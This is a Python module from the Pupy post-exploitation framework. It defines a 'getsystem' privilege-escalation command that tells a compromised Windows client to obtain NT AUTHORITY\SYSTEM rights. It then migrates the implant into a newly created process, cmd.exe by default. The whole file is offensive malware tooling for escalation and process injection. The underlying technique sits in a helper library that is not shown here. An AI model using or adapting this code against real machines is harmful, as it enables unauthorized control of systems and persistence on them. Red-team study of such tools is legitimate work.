# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
from modules.lib.windows.migrate import migrate
__class_name__="GetSystem"

@config(compat="windows", category="privesc")
class GetSystem(PupyModule):
    """ try to get NT AUTHORITY SYSTEM privileges """
    dependencies=["pupwinutils.security"]
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="getsystem", description=self.__doc__)
        self.arg_parser.add_argument("--prog", default="cmd.exe", help="Change the default process to create/inject into")

    def run(self, args):
        with redirected_stdo(self):
            proc_pid=self.client.conn.modules["pupwinutils.security"].getsystem(prog=args.prog)
        migrate(self, proc_pid)
        self.success("got system !")
